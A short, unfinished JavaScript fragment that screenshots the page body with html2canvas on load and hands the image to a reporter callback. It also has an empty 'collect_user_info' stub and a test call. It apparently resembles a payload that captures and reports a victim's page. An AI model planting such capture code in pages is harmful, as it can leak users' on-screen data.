function do_screenshot() {
    load_worked = false;
    function on_load(context) {
        if (load_worked) return;
        load_worked = true;
        debugger;
        context.html2canvas(document.body).then(function(canvas) {
            var png = canvas.toDataURL("image/png");
            context.reporter(context, 'screenshot', png)
        });
    }
    var on_load_lambda = function() { on_load(context) };
    if (document.readyState == "complete")
        on_load_lambda();
    else
        document.addEventListener("DOMContentLoaded", on_load_lambda);
}

function collect_user_info() {

}

//do_screenshot();
context.reporter(context, 'test', 'qwe123', console.log)